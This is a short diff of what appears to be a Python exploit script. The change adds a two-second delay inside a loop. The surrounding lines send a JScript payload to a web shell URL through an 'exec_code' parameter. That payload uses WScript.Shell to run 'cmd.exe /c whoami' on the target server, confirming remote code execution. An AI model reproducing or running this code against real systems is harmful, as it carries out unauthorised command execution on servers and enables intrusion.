@@ -400,6 +400,7 @@ def main():
         for _ in range(0, 5):
             whoami = f'Response.Write(new ActiveXObject("WScript.Shell").Exec("cmd.exe /c whoami").StdOut.ReadAll());'
             f = requests.post(shell_url,headers={'Content-Type': 'application/x-www-form-urlencoded'},params={"exec_code":whoami}, verify=False)
+            time.sleep(2)
             if f.status_code == 200:
                 if f.text.split('!BD')[0].split('\n')[0]:
                     print(f.text.split('!BD')[0].split('\n')[0])
